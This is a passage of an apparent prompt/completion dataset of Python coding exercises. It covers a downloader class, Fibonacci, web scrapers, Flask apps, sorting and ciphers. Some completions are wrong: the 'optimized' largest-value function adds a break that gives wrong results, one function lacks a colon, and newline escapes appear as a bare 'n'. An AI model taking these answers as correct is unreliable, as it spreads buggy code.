os.path.isfile(self.get_instance_path()) def is_done(self): return os.path.isfile(self.get_done_path()) def start_install(self): self.mutexInstalling.acquire() self.canceled = False self.downloadPercent = 0 self.play_thread_id = thread.start_new_thread(self.install_thread, ()) def cancel_install(self): self.canceled = True def wait_install_end(self): self.mutexInstalling.acquire() self.mutexInstalling.release() def download(self): f = urllib2.urlopen(self.get_file_path()) _, tempPath = tempfile.mkstemp(\\"\\", \\"perroquet-\\"); wf = open(tempPath, 'w+b') size = f.info().get('Content-Length') if size is None: size = 0 else: size = int(size) count = 0 sizeToRead = 50000 while not self.canceled: data = f.read(sizeToRead) wf.write(data) if len(data) != sizeToRead: break; count += sizeToRead self.downloadPercent = (round((float(count) / float(size)) * 100)) self.downloading = False return tempPath def get_download_percent(self): return self.downloadPercent def get_state(self): #available #downloading #installing #installed #corrupted #canceled #removing #used #done if self.state == \\"none\\": if self.is_done(): self.state = \\"done\\" elif self.is_used(): self.state = \\"used\\" elif self.is_installed(): self.state = \\"installed\\" else: self.state = \\"available\\" return self.state def set_state(self, state): oldState = self.state self.state = state self.notifyStateChange(oldState, self.callbackData) def set_state_change_callback(self, callback, callbackData): self.notifyStateChange = callback self.callbackData = callbackData def install_thread(self): self.set_state(\\"downloading\\") tmpPath = self.download() if self.canceled: self.logger.info(\\"remove temp file\\") self.set_state(\\"canceled\\") os.remove(tmpPath) else: self.set_state(\\"installing\\") tar = tarfile.open(tmpPath) outPath = self.get_local_path() try: os.makedirs(outPath) except OSError, (ErrorNumber, ErrorMessage): # Python <=2.5 if ErrorNumber == errno.EEXIST: pass else: raise tar.extractall(outPath) tar.close() os.remove(tmpPath) if self.is_installed(): self.set_state(\\"installed\\") else: self.set_state(\\"corrupted\\") self.mutexInstalling.release() def get_template_path(self): return os.path.join(self.get_local_path(), \\"template.perroquet\\") def get_instance_path(self): return os.path.join(self.get_personnal_local_path(), \\"instance.perroquet\\") def get_done_path(self): return os.path.join(self.get_personnal_local_path(), \\"done.perroquet\\") def set_name(self, name): self.name = name def get_name(self): return self.name def set_id(self, id): self.id = id def get_id(self): return self.id def set_description(self, description): self.description = description def get_description(self): return self.description def set_licence(self, licence): self.licence = licence def get_licence(self): return self.licence def set_language(self, language): self.language = language def get_language(self): return self.language def set_media_type(self, mediaType): self.mediaType = mediaType def get_media_type(self): return self.mediaType def set_version(self, version): self.version = version def get_version(self): return self.version def set_author(self, author): self.author = author def get_author(self): return self.author def set_words_count(self, wordsCount): self.wordsCount = wordsCount def get_words_count(self): return self.wordsCount def set_author_website(self, authorWebsite): self.authorWebsite = authorWebsite def get_author_website(self): return self.authorWebsite def set_author_contact(self, authorContact): self.authorContact = authorContact def get_author_contact(self): return self.authorContact def set_packager(self, packager): self.packager = packager def get_packager(self): return self.packager def set_packager_website(self, packagerWebsite): self.packagerWebsite = packagerWebsite def get_packager_website(self): return self.packagerWebsite def set_packager_contact(self, packagerContact): self.packagerContact = packagerContact def get_packager_contact(self): return self.packagerContact def set_file_path(self, filePath): self.filePath = filePath def get_file_path(self): return self.filePath def set_translations_list(self, translationList): self.translationList = translationList def get_translations_list(self): return self.translationList def set_parent(self, parent): self.parent = parent def get_local_path(self): versioned_id = None if self.version is not None: versioned_id = self.id + \\"_\\" + self.version else: versioned_id = self.id return os.path.join(self.parent.get_local_path(), versioned_id) def get_personnal_local_path(self): versioned_id = None if self.version is not None: versioned_id = self.id + \\"_\\" + self.version else: versioned_id = self.id return os.path.join(self.parent.get_personal_local_path(), versioned_id) def parse_description(self, xml_exercise): self.set_name(self._get_text(xml_exercise.getElementsByTagName(\\"name\\")[0].childNodes)) self.set_id(self._get_text(xml_exercise.getElementsByTagName(\\"id\\")[0].childNodes)) self.set_description(self._get_text(xml_exercise.getElementsByTagName(\\"description\\")[0].childNodes)) self.set_licence(self._get_text(xml_exercise.getElementsByTagName(\\"licence\\")[0].childNodes)) self.set_language(self._get_text(xml_exercise.getElementsByTagName(\\"language\\")[0].childNodes)) self.set_media_type(self._get_text(xml_exercise.getElementsByTagName(\\"media_type\\")[0].childNodes)) self.set_version(self._get_text(xml_exercise.getElementsByTagName(\\"exercise_version\\")[0].childNodes)) self.set_author(self._get_text(xml_exercise.getElementsByTagName(\\"author\\")[0].childNodes)) self.set_author_website(self._get_text(xml_exercise.getElementsByTagName(\\"author_website\\")[0].childNodes)) self.set_author_contact(self._get_text(xml_exercise.getElementsByTagName(\\"author_contact\\")[0].childNodes)) self.set_packager(self._get_text(xml_exercise.getElementsByTagName(\\"packager\\")[0].childNodes)) self.set_packager_website(self._get_text(xml_exercise.getElementsByTagName(\\"packager_website\\")[0].childNodes)) self.set_packager_contact(self._get_text(xml_exercise.getElementsByTagName(\\"packager_contact\\")[0].childNodes)) if len(xml_exercise.getElementsByTagName(\\"words_count\\")) > 0: self.set_words_count(self._get_text(xml_exercise.getElementsByTagName(\\"words_count\\")[0].childNodes)) if len(xml_exercise.getElementsByTagName(\\"file\\")) > 0: self.set_file_path(self._get_text(xml_exercise.getElementsByTagName(\\"file\\")[0].childNodes)) if len(xml_exercise.getElementsByTagName(\\"translations\\")) > 0: xml_translations = xml_exercise.getElementsByTagName(\\"translations\\")[0] translationList = [] for xml_translation in xml_translations.getElementsByTagName(\\"translation\\"): translationList.append(self._get_text(xml_translation.childNodes)) self.set_translations_list(translationList) def generate_description(self): self._generate_description() def _generate_description(self): if not os.path.isdir(self.get_local_path()): try: os.makedirs(self.get_local_path()) except OSError, (ErrorNumber, ErrorMessage): # Python <=2.5 if ErrorNumber == 666: #EEXIST ??? pass else: raise impl = getDOMImplementation() newdoc = impl.createDocument(None, \\"perroquet_exercise\\", None) root_element = newdoc.documentElement # Name xml_name = newdoc.createElement(\\"name\\") xml_name.appendChild(newdoc.createTextNode(self.get_name())) root_element.appendChild(xml_name) # Id xml_id = newdoc.createElement(\\"id\\") xml_id.appendChild(newdoc.createTextNode(self.get_id())) root_element.appendChild(xml_id) # Description xml_description = newdoc.createElement(\\"description\\") xml_description.appendChild(newdoc.createTextNode(self.get_description())) root_element.appendChild(xml_description) # Words count xml_version = newdoc.createElement(\\"words_count\\") xml_version.appendChild(newdoc.createTextNode(str(self.get_words_count()))) root_element.appendChild(xml_version) # Version xml_version = newdoc.createElement(\\"exercise_version\\") xml_version.appendChild(newdoc.createTextNode(self.get_version())) root_element.appendChild(xml_version) # Licence xml_node = newdoc.createElement(\\"licence\\") xml_node.appendChild(newdoc.createTextNode(self.get_licence())) root_element.appendChild(xml_node) # Language xml_node = newdoc.createElement(\\"language\\") xml_node.appendChild(newdoc.createTextNode(self.get_language())) root_element.appendChild(xml_node) # Media type xml_node = newdoc.createElement(\\"media_type\\") xml_node.appendChild(newdoc.createTextNode(self.get_media_type())) root_element.appendChild(xml_node) # author xml_node = newdoc.createElement(\\"author\\") xml_node.appendChild(newdoc.createTextNode(self.get_author())) root_element.appendChild(xml_node) # author website xml_node = newdoc.createElement(\\"author_website\\") xml_node.appendChild(newdoc.createTextNode(self.get_author_website())) root_element.appendChild(xml_node) # author contact xml_node = newdoc.createElement(\\"author_contact\\") xml_node.appendChild(newdoc.createTextNode(self.get_author_contact())) root_element.appendChild(xml_node) # packager xml_node = newdoc.createElement(\\"packager\\") xml_node.appendChild(newdoc.createTextNode(self.get_packager())) root_element.appendChild(xml_node) # packager website xml_node = newdoc.createElement(\\"packager_website\\") xml_node.appendChild(newdoc.createTextNode(self.get_packager_website())) root_element.appendChild(xml_node) # packager contact xml_node = newdoc.createElement(\\"packager_contact\\") xml_node.appendChild(newdoc.createTextNode(self.get_packager_contact())) root_element.appendChild(xml_node) # template path xml_node = newdoc.createElement(\\"template\\") xml_node.appendChild(newdoc.createTextNode(self.get_template_path())) root_element.appendChild(xml_node) # translation #TODO xml_string = newdoc.toprettyxml() xml_string = xml_string.encode('utf8') repoDescriptionPath = os.path.join(self.get_local_path(), \\"exercise.xml\\") f = open(repoDescriptionPath, 'w') f.write(xml_string) f.close() def init_from_path(self, exercisePath): exerciseDescriptionPath = os.path.join(exercisePath, \\"exercise.xml\\") if os.path.isfile(exerciseDescriptionPath): f = open(exerciseDescriptionPath, 'r') dom = parse(f) self.parse_description(dom) else: self.id = os.path.basename(exercisePath) self.name = self.id self.description = gettext.gettext(\\"Imported exercise\\") def _get_text(self, nodelist): rc = \\"\\" for node in nodelist: if node.nodeType == node.TEXT_NODE: rc = rc + node.data rc = rc.strip() return rc"},{"prompt":"Create a Python program to print out the first 20 numbers of the Fibonacci sequence.","completion":"def Fibonacci(n): if n < 0: print(\\"Incorrect input\\") # First Fibonacci number is 0 elif n == 0: return 0 # Second Fibonacci number is 1 elif n == 1: return 1 else: return Fibonacci(n-1) + Fibonacci(n-2) # Driver Program print(\\"First 20 Fibonacci numbers:\\") for i in range(20): print(Fibonacci(i))"},{"prompt":"Create a Python program to detect spam messages using Machine Learning. Not applicable","completion":"import pandas as pd from sklearn.feature_extraction.text import CountVectorizer from sklearn.naive_bayes import MultinomialNB # read data data = pd.read_csv('data.csv') # create features vectorizer = CountVectorizer() features = vectorizer.fit_transform(data.text) # create and train model model = MultinomialNB() model.fit(features, data.label) # predict labels predicted_labels = model.predict(features) # print results print(predicted_labels)"},{"prompt":"Create a linear regression model in Python that predicts the outcome of a simple dataset. x = [1, 2, 3, 4, 5], y = [1, 2, 3, 4, 5]","completion":"# import the necessary libraries import numpy as np import matplotlib.pyplot as plt # Create the dataset x = np.array([1, 2, 3, 4, 5]) y = np.array([1, 2, 3, 4, 5]) # Create the model # Fit the data coeff = np.polyfit(x, y, 1) # Generate the prediction predict = np.poly1d(coeff) # Plot the regression line plt.plot(x, y, 'o') plt.plot(x, predict(x), 'x') plt.xlabel('x-axis') plt.ylabel('y-axis') plt.show()"},{"prompt":"Train a neural network in Python to classify text into two categories. <data set>","completion":"# import necessary packages for pre-processing and training import pandas as pd import numpy as np import tensorflow as tf from tensorflow.keras.preprocessing.text import Tokenizer from tensorflow.keras.preprocessing.sequence import pad_sequences # load data set data = pd.read_csv(\\"<data set>\\") # create labels for the categories labels = data.columns[2:] # create train and test sets, with only the text and labels columns train_text = data['text'].values train_labels = data[labels].values # set up parameters for tokenizer vocab_size = 10000 # max number of words in the vocabulary oov_token = \\"<OOV>\\" # out of vocabulary token max_length = 120 # max length of sentences # create tokenizer tokenizer = Tokenizer(num_words=vocab_size, oov_token=oov_token) tokenizer.fit_on_texts(train_text) # create sequences from the tokenizer train_sequences = tokenizer.texts_to_sequences(train_text) # pad the sequences so they are all the same length train_padded = pad_sequences(train_sequences, maxlen=max_length, padding='post', truncating='post') # set up the neural network model = tf.keras.Sequential() model.add(tf.keras.layers.Embedding(vocab_size, 128, input_length=max_length)) model.add(tf.keras.layers.GlobalAveragePooling1D()) model.add(tf.keras.layers.Dense(64, activation='relu')) model.add(tf.keras.layers.Dense(len(labels), activation='sigmoid')) # compile and fit the model model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy']) model.fit(train_padded, train_labels, epochs=10)"},{"prompt":"Generate a python function that takes an array as an argument and returns the distinct elements in the array.","completion":"def distinct_values(arr): distinct_arr = [] for element in arr: if element not in distinct_arr: distinct_arr.append(element) return distinct_arr"},{"prompt":"Make a network request using Python and retrieve the name of the user who is currently logged in.","completion":"import requests url = 'http://example.com/api/userdata' userdata = requests.get(url).json() name = userdata['name'] print(name)"},{"prompt":"Create a Tictactoe game in Python.","completion":"import random # Function to draw tic-tac-toe board def drawBoard(board): print(\\"--- --- ---\\") print(\\"| \\" + board[0][0] + \\" | \\" + board[0][1] + \\" | \\" + board[0][2] + \\" |\\") print(\\"--- --- ---\\") print(\\"| \\" + board[1][0] + \\" | \\" + board[1][1] + \\" | \\" + board[1][2] + \\" |\\") print(\\"--- --- ---\\") print(\\"| \\" + board[2][0] + \\" | \\" + board[2][1] + \\" | \\" + board[2][2] + \\" |\\") print(\\"--- --- ---\\") # Function to check if any player has won horizontally or vertically def checkWin(board): # Win Horizontally for x in range(0, 3): if (board[x][0] == board[x][1] and board[x][1] == board[x][2] and board[x][0] != ' '): return board[x][0];"},{"prompt":"Create a web service in Python that can generate random numbers.","completion":"from flask import Flask import random # Create a Flask object app = Flask(__name__) @app.route(\\"/random/<int:min>/<int:max>\\") def generate_random_number(min, max): # Generate a random number between min and max random_number = random.randint(min, max) return str(random_number) if __name__ == \\"__main__\\": app.run()"},{"prompt":"Write a Python program that takes a list of numbers as input and returns a list of the same numbers sorted from least to greatest. list_nums = [6, 8, 4, 2, 5]","completion":"list_nums = [6, 8, 4, 2, 5] def sort_nums_ascending(input_list): for x in range(len(input_list)-1): min_val = x for y in range(x+1, len(input_list)): if input_list[min_val] > input_list[y]: min_val = y input_list[x], input_list[min_val] = input_list[min_val], input_list[x] return input_list print(sort_nums_ascending(list_nums))"},{"prompt":"Create a Python program to search a list for the maximum value. list = [1, 2, 3, 9, 8, 4]","completion":"def findMax(list): max = list[0] for i in range(1, len(list)): if list[i] > max: max = list[i] return max list = [1, 2, 3, 9, 8, 4] print(\\"The maximum element in the list is:\\", findMax(list))"},{"prompt":"Write a Python program to accept a string input from the user and print each character in a list. String: Hello World","completion":"user_input = input(\\"Enter a string: \\") char_list = [] for char in user_input: char_list.append(char) print(char_list)"},{"prompt":"Design a web scraper in Python that retrieves each book title from the Goodreads Popular Books list. url: https://www.goodreads.com/list/show/1.Best_Books_Ever","completion":"import requests from bs4 import BeautifulSoup #get the web page page = requests.get(\\"https://www.goodreads.com/list/show/1.Best_Books_Ever\\") #parse the web page soup = BeautifulSoup (page.content, 'html.parser') #get each book title book_title = soup.find_all(class_=\\"bookTitle\\") #Print the books for title in book_title: print(title.get_text())"},{"prompt":"Construct a Python program that prints out all the numbers from 1 to a given number n.","completion":"def print_numbers(n): for num in range(1, n+1): print(num)"},{"prompt":"Write a Python program to create a class for handling web requests that returns a response in the UTF8 encoding. Not applicable","completion":"import requests class RequestHandler: def __init__(self): self.session = requests.Session() def get(self, url): response = self.session.get(url) response.encoding = 'utf-8' return response def post(self, url, data): response = self.session.post(url, data=data) response.encoding = 'utf-8' return response"},{"prompt":"Design a board game in Python. Not applicable","completion":"import random board = [[0, 0, 0], [0, 0, 0], [0, 0, 0]] players = ['player1', 'player2'] def draw_board(board): for row in board: print(row) def check_win(board): for row in board: if row.count(row[0]) == len(row) and row[0] != 0: return True diag1 = [] diag2 = [] for i, row in enumerate(board): diag1.append(row[i]) diag2.append(row[len(board)-i-1]) if diag1.count(diag1[0]) == len(diag1) and diag1[0] != 0: return True if diag2.count(diag2[0]) == len(diag2) and diag2[0] != 0: return True return False def check_draw(board): for row in board: for elem in row: if elem == 0: return False return True def play_game(): current_player = players[random.randint(0, len(players)-1)] game_is_over = False while not game_is_over: draw_board(board) print(\\"It's your turn, \\" + current_player) row = input(\\"Row: \\") column = input(\\"Column: \\") board[int(row)][int(column)]=current_player game_is_over = check_win(board) if game_is_over: print(\\"Congrats, \\" + current_player + \\"! You win! 🎉\\") else: if check_draw(board): print(\\"It's a draw!\\") game_is_over = True else: if current_player == players[0]: current_player = players[1] else: current_player = players[0] play_game()"},{"prompt":"Write a Python program that checks if a given number is prime. 7","completion":"def is_prime(n): if n == 2 or n == 3: return True if n < 2 or n%2 == 0: return False if n < 9: return True if n%3 == 0: return False r = int(n**0.5) f = 5 while f <= r: if n%f == 0: return False if n % (f+2) == 0: return False f += 6 return True num = 7 print(\\"Is\\", num, \\"prime?: \\", is_prime(num))"},{"prompt":"Write Python code to edit a given function and optimize it so that it will run faster. def find_largest_value(arr): largest_value = float('inf') for i in range(len(arr)): for j in range(i+1, len(arr)): if arr[i] + arr[j] > largest_value: largest_value = arr[i] + arr[j] return largest_value","completion":"def find_largest_value(arr): largest_value = -float('inf') for i in range(len(arr)): for j in range(i+1, len(arr)): if arr[i] + arr[j] > largest_value: largest_value = arr[i] + arr[j] break return largest_value"},{"prompt":"Write a Python class to represent a rectangle with length and width variables and a method to calculate the area.","completion":"class Rectangle: def __init__(self, length, width): self.length = length self.width = width def calculate_area(self): return self.length * self.width rect = Rectangle(3, 4) print(rect.calculate_area())"},{"prompt":"Design a genetic algorithm in Python to maximize the value of a given function. f(x) = x^2 4x + 3","completion":"import random # function to calculate the value of a function def func(x): return x**2 - 4*x + 3 # population size pop_size = 50 # range of initial values of x x_range = [-20, 20] # mutation rate mutation_rate = 0.02 # maximum generation allowed max_generation = 100 # function to generate a random population def initial_population(pop_size, x_range): population = [] for _ in range(pop_size): x = random.randint(*x_range) population.append(x) return population # function to calculate the current fitness of a given population def calculate_fitness(population): fitness = [] for x in population: fx = func(x) fitness.append(fx) return fitness # function to evolve the population to the next generation def evolve_population(population, mutation_rate): population_fitness = calculate_fitness(population) idx_max_fit = population_fitness.index(max(population_fitness)) new_population = [] for idx, x in enumerate(population): if idx == idx_max_fit: new_population.append(x) else: mutation_chance = random.random() if mutation_chance <= mutation_rate: new_x = x + random.randint(-1, 1) new_population.append(new_x) else: new_population.append(x) return new_population # generate the population population = initial_population(pop_size, x_range) # main loop of the genetic algorithm for i in range(max_generation): population = evolve_population(population, mutation_rate) # obtain the fittest solution population_fitness = calculate_fitness(population) idx_max_fit = population_fitness.index(max(population_fitness)) max_fitness_solution = population[idx_max_fit] # print out the fittest solution print(\\"Max fitness: \\", max(population_fitness)) print(\\"Max fitness solution: \\", max_fitness_solution)"},{"prompt":"Can you write a python code that extracts the upper case character from a given string? Input String: Foobar","completion":"input_string = 'Foobar' upper_case_characters = [] for char in input_string: if char.isupper(): upper_case_characters.append(char) print(upper_case_characters)"},{"prompt":"Create a Python script to send an email with the given input text. Subject: Daily reminder Message: Remember to stay safe and healthy!","completion":"import smtplib server = smtplib.SMTP('smtp.gmail.com', 587) server.ehlo() server.starttls() sender_email = \\"sender_email_address@example.com\\" receiver_email = \\"receiver_email_address@example.com\\" message = 'Subject: {}nn{}'.format('Daily reminder', 'Remember to stay safe and healthy!') server.login(sender_email, \\"password\\") server.sendmail(sender_email, receiver_email, message) server.quit()"},{"prompt":"Create an exponentially weighted moving average (EWMA) chart in Python to track the performance of a stock price over time.","completion":"import matplotlib.pyplot as plt import numpy as np #Create array with stock prices prices = [5, 10, 20, 25, 10, 8, 22] #Calculate EWMA weight = 0.9 alpha = 1 - weight ewma = np.zeros_like(prices) ewma[0] = prices[0] for i in range(1, len(prices)): ewma[i] = weight*ewma[i-1] + alpha*prices[i] #Plot the EWMA plt.plot(ewma) plt.title('Exponentially Weighted Moving Average') plt.ylabel('Price') plt.xlabel('Time (days)') plt.show()"},{"prompt":"Generate a python program to iterate through a given list and find the minimum value. [5, 7, 1, 4]","completion":"def find_min(arr): min_val = arr[0] for i in arr: if i < min_val: min_val = i return min_val arr = [5, 7, -1, 4] min_val = find_min(arr) print(min_val)"},{"prompt":"Write a python program which given a input string, identifies if it is a palindrome or not. Input String: bob","completion":"def is_palindrome(input_string): # Reverse the string and see if it matches the original string reversed_string = input_string[::-1] if reversed_string == input_string: return True else: return False # Test the program test_string = 'bob' if is_palindrome(test_string): print(\\"The string is a palindrome.\\") else: print(\\"The string is not a palindrome.\\")"},{"prompt":"Generate a python program to reverse an integer.","completion":"def reverse_integer(n): # initialize the output to 0 rev = 0 # use a while loop to iterate through the number, # adding each digit to the output while n > 0: rev = (rev * 10) + (n % 10) n = n // 10 return rev"},{"prompt":"Create a function in Python to find the maximum value among five elements.","completion":"def find_max_value(list_of_values): return max(list_of_values) # Driver code list_of_values = [1, 5, 9, 4, 8] max_value = find_max_value(list_of_values) print(\\"The maximum value is:\\", max_value)"},{"prompt":"Generate a new Python list that contains only the even values from a given list. list = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]","completion":"def get_even_list(list): even_list = [] for num in list: if num % 2 == 0: even_list.append(num) return even_list list = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] print(get_even_list(list))"},{"prompt":"Write a function that returns the maximum value between two numbers in Python.","completion":"def get_max(a, b): if a > b: return a else: return b"},{"prompt":"Create a Python program to multiply all of the values in a given list [2, 3, 4]","completion":"def multiply_list(lst): result = 1 for i in lst: result *= i return result"},{"prompt":"Write a Python program that automatically generates a random password of length 10. The password should contain alphanumeric characters and at least one special character. Not applicable","completion":"import string import random def generate_password(length): password = [] characters = string.ascii_letters + string.digits + string.punctuation for i in range(length): password.append(random.choice(characters)) return ''.join(password) password = generate_password(10) print(password) # e7bVh*4~y#"},{"prompt":"Generate a set of commands to create a web application.","completion":"# Create the project structure mkdir app cd app mkdir static templates # Install all the dependencies pip install flask pip install flask-sqlalchemy # Create the application touch app.py # Create the base template touch templates/base.html # Create the model touch models.py # Create the view touch views.py # Create the routes touch routes.py # Create the static assets touch static/style.css # Create the database python manage.py db init python manage.py db migrate python manage.py db upgrade # Run the server python app.py"},{"prompt":"Write a Python program to add two numbers given in string format. first number: 2 second number: 3","completion":"def addStringNumbers(num1,num2): return int(num1) + int(num2)"},{"prompt":"Create a function in Python that input two strings and outputs the longer string. Hello, World","completion":"def get_longer_string(str1, str2): if len(str1) > len(str2): return str1 else: return str2"},{"prompt":"Create a Python program to generate a series of random numbers based on a user input.","completion":"import random def generate_random_series(num): \\"\\"\\"Generates and returns a list of random numbers based on a user input.\\"\\"\\" # Create an empty list and append to it each time you generate a random number random_series = [] for _ in range(num): random_number = random.randint(0, 1000) random_series.append(random_number) return random_series"},{"prompt":"Write a function in Python that sorts a given list of strings in alphabetical order case insensitive. input_list = [BANANA, apple, Orange , GRAPES]","completion":"def sort_strings_case_insensitive(input_list): return sorted([string.strip().lower() for string in input_list])"},{"prompt":"Design a function that returns the least common multiple (LCM) of two numbers two integers a and b","completion":"# Python3 program to find LCM of two numbers # method to return gcd of a and b def gcd(a, b): if a == 0 : return b return gcd(b % a, a) # method to return LCM of two numbers def lcm(a, b): return (a*b) // gcd(a, b)"},{"prompt":"Create a Python script that will take two strings as input and checks if they are anagrams. cinema iceman","completion":"string1 = input(\\"Enter first string: \\") string2 = input(\\"Enter second string: \\") def isAnagram(string1, string2): string1 = string1.lower() string2 = string2.lower() if sorted(string1) == sorted(string2): return True else: return False if isAnagram(string1, string2): print(\\"The strings entered are anagrams\\") else: print(\\"The strings entered are not anagrams\\")"},{"prompt":"mprove the performance of this Python function by adding caching or other techniques. def add_two_numbers(n1, n2): return n1 + n2","completion":"import functools @functools.lru_cache(maxsize=None) def add_two_numbers(n1, n2): return n1 + n2"},{"prompt":"Create an web application using Python Flask to calculate the temperature and humidity of a given location. Location: Los Angele","completion":"import requests import json import flask from flask import request, jsonify app = flask.Flask(__name__) @app.route('/temperature', methods=['POST']) def temperature(): location = request.json['location'] url = 'https://api.openweathermap.org/data/2.5/weather?' payload = {'q': location, 'appid': 'your_api_key_here'} r = requests.get(url, params=payload).json() temperature = r['main']['temp'] - 273.15 humidity = r['main']['humidity'] result = { 'location': location, 'temperature': temperature, 'humidity': humidity } return jsonify(result) if __name__ == '__main__': app.run(debug=True)"},{"prompt":"Write a Python function to calculate the Levenshtein distance between two strings. 'stenography' and 'graphomist'","completion":"def levenshtein_distance(s1, s2): n = len(s1) m = len(s2) table = [[0] * (m+1) for _ in range(n+1)] for i in range(n+1): table[i][0] = i for j in range(m+1): table[0][j] = j for i in range(1, n+1): for j in range(1, m+1): diff = 0 if s1[i-1] == s2[j-1] else 1 table[i][j] = min(table[i-1][j-1] + diff, table[i-1][j] + 1, table[i][j-1] + 1) return table[n][m] str1 = \\"stenography\\" str2 = \\"graphomist\\" result = levenshtein_distance(str1, str2) print(result)"},{"prompt":"Generate a Python code to find the sum of natural numbers up to n. n = 10","completion":"def findSum(n): sum = 0 for num in range(0, n+1): sum += num return sum n = 10 sum_of_natural_num = findSum(n) print(sum_of_natural_num)"},{"prompt":"Generate a random string using Python.","completion":"import string import random def random_string(stringLength): letters = string.ascii_lowercase return ''.join(random.choice(letters) for i in range(stringLength)) print(random_string(10))"},{"prompt":"Create a script in Python which receives a list of numbers, and prints the sorted list in ascending order. List of numbers: [7, 3, 4, 2]","completion":"list_of_numbers = [7, 3, 4, 2] # sort the list list_of_numbers.sort() # print the sorted list print(list_of_numbers)"},{"prompt":"Construct a Python class with the following atributes and methods. Attributes: name, ID Methods: setName, setID, getName, getID","completion":"class MyClass: def __init__(self): self.name = \\"\\" self.ID = 0 def setName(self, name): self.name = name def setID(self, ID): self.ID = ID def getName(self): return self.name def getID(self): return self.ID"},{"prompt":"Write a webscraping script in Python to fetch the first 100 data entries of a website.","completion":"import requests from bs4 import BeautifulSoup url = \\"THE_WEBSITE_URL\\" # Get website content response = requests.get(url) # Parse the content of the response soup = BeautifulSoup(response.text, 'html.parser') # Find all html elements of the class \\"data-entry\\" data_entries = soup.find_all(class_=\\"data-entry\\") # Fetch the first 100 data entries for entry in data_entries[:100]: print(entry.text)"},{"prompt":"Create a program in Python that shuffles an array of numbers. [1, 5, 8, 11, 3]","completion":"import random # Create an array arr = [1, 5, 8, 11, 3] # Function to shuffle an array def shuffle_array(arr): random.shuffle(arr) return arr # Shuffle the array and print the result print(shuffle_array(arr))"},{"prompt":"Create an algorithm in Python to calculate the Fibonacci sequence up to a given number. Not applicable","completion":"def fibonacci(n): a, b = 0, 1 while a < n: print(a, end=' ') a, b = b, a+b fibonacci(100)"},{"prompt":"Generate a function in python that takes in an array argument and counts the number of elements in it.","completion":"def count_elements(arr): return len(arr)"},{"prompt":"Create a python program to simulate a race between two cars.","completion":"import random # Initialize cars class Car: def __init__(self, name): self.name = name self.speed = 0 self.distance_travelled = 0 # Create cars car1 = Car('Red') car2 = Car('Black') # Simulation loop while(True): # Increase speed for each car car1.speed = round(random.uniform(0, 100), 2) car2.speed = round(random.uniform(0, 100), 2) # If any car has higher speed, increase its distance if car1.speed > car2.speed: car1.distance_travelled += car1.speed else: car2.distance_travelled += car2.speed # Display the current state print('Car 1 Speed: ', car1.speed, ' km/h', 'tCar 1 Distance Travelled:', car1.distance_travelled, 'nCar 2 Speed: ', car2.speed, ' km/h', 'tCar 2 Distance Travelled:', car2.distance_travelled) # End the loop if either car has travelled 1000 km or more if car1.distance_travelled >= 1000 or car2.distance_travelled >= 1000: break # Print the final winner of the race if car1.distance_travelled > car2.distance_travelled: print('n{} won the race!'.format(car1.name)) else: print('n{} won the race!'.format(car2.name))"},{"prompt":"Optimize a code snippet to port the code from Python to R. // Python code snippet def add_numbers(a, b): return a + b","completion":"# R code snippet add_numbers <- function(a, b) { a + b }"},{"prompt":"Create a web scraper in Python to scrape product prices from a given URL. URL: https://example.com/productl","completion":"import requests from bs4 import BeautifulSoup # make the request URL = \\"https://example.com/product-list\\" response = requests.get(URL) # parse the HTML soup = BeautifulSoup(response.content, 'html.parser') # find all product prices on the page prices = soup.find_all('span', class_=\\"price\\") # print out all the prices for price in prices: print(price.text)"},{"prompt":"Design a program in Python that can ask the user to enter 10 numbers and then find the average of those 10 numbers.","completion":"numbers = [] # Ask the user to enter 10 numbers for i in range (10): numbers.append(int(input(\\"Enter number #\\" + str(i+1) + \\": \\"))) # Calculate and print the average of the numbers mean = sum(numbers) / len(numbers) print(\\"Mean:\\", mean)"},{"prompt":"Construct a program with Python for calculating the average of the numbers in a given list","completion":"\\"\\"\\" Construct a program with Python for calculating the average of the numbers in a given list \\"\\"\\" def calculate_average(numbers): # Calculate the sum of the numbers total_sum = 0 for n in numbers: total_sum += n # Calculate the average of the numbers average = total_sum/len(numbers) return average if __name__ == '__main__': numbers = [1, 2, 3, 4, 5] print(f'The average of the numbers in the list is: {calculate_average(numbers)}')"},{"prompt":"Design a Python function that converts strings in any given sentence to a capitalized format. This is an example sentence","completion":"def convertToCapitalize(sentence) words = sentence.split() capitalize = [word.capitalize() for word in words] return \\" \\".join(capitalize)"},{"prompt":"Write a Python program to collect user input and determine how many numbers in the list are greater than the user's number. User input: 9 List: [6, 7, 8, 9, 10]","completion":"def count_greater_than_user(user_num, num_list): count = 0 for number in num_list: if number > user_num: count += 1 return count user_num = int(input(\\"User input: \\")) num_list = [6, 7, 8, 9, 10] result = count_greater_than_user(user_num, num_list) print(f\\"Number of numbers greater than {user_num}: {result}\\")"},{"prompt":"Create a web scraper in Python that extracts data from a given website. Website URL: https://www.example.com","completion":"# Importing necessary modules import requests from bs4 import BeautifulSoup # The URL to get data from url = \\"https://www.example.com\\" # Making a request to the website and getting the response response = requests.get(url) soup = BeautifulSoup(response.content, 'html.parser') # Extracting the required data data = soup.find_all('p') # Looping through the data and printing it out for item in data: print(item.text)"},{"prompt":"Design a program in Python to encrypt a given string with the Caesar cipher. Hello World","completion":"#Function to encrypt using Caesar Cipher def caesarCipherEncrypt(plainText, shift): cipherText = \\"\\" for ch in plainText: if ch.isalpha(): stayInAlphabet = ord(ch) + shift if stayInAlphabet > ord('z'): stayInAlphabet -= 26 finalLetter = chr(stayInAlphabet) cipherText += finalLetter else: cipherText += ch return cipherText #Call the function encryptedText = caesarCipherEncrypt(\\"Hello World\\", 3) print(\\"Encrypted Text :\\", encryptedText)"},{"prompt":"Write a Python program to align two given strings with equal lines. x = X AX BB CCC y = 1 AAA BBB CC","completion":"def align_strs(x,y): lines_x = x.split('n') lines_y = y.split('n') max_len = max(len(lines_x),len(lines_y)) result = \\"\\" for i in range(max_len): if i < len(lines_x): result += lines_x[i] + \\"n\\" if i < len(lines_y): result += lines_y[i] + \\"n\\" return result"},{"prompt":"The code is a Python script that checks for the latest episode of Bigg Boss 8 on colors.in.com. To use the script, run it from the command line with optional arguments for a custom search pattern or verbose output. The script will send a request to the server, get the page data as a string, and search for the latest episode link and episode list based on a pattern. If a new episode is found, the script will notify the user and print the link. Otherwise, it will print No new episode right now. The script is free software under the GNU General Public License.","completion":"#!/usr/bin/env python3 # # Copyright (c) 2014 Shubham Chaudhary <me@shubhamchaudhary.in> # # This program is free software: you can redistribute it and/or modify # it under the 